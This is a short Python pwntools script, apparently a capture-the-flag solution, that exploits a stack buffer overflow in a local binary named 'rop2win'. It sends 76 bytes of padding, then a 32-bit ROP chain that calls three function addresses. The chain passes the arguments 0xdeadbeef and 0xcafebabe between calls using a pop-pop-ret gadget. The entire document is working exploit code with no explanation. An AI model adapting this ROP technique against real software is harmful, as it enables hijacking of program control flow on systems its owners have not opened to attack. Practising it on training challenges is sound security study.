from pwn import *

def main():
	func_one = p32(0x080491c2)
	func_two = p32(0x080492cf)
	func_three = p32(0x08049355)

	#0x08049756: pop edi; pop ebp; ret;
	gadget = p32(0x08049756)

	padding = b'A' * 76

	arg1 = p32(0xdeadbeef)
	arg2 = p32(0xcafebabe)

	payload = padding
	payload += func_one
	payload += gadget
	payload += arg1
	payload += arg2
	payload += func_two
	payload += gadget
	payload += arg1
	payload += arg2
	payload += func_three
	payload += b'BBBB'
	payload += arg1
	payload += arg2

	io = process('./rop2win')
	io.sendline(payload)
	io.interactive()
	#print(payload)

if __name__ == '__main__':
	main()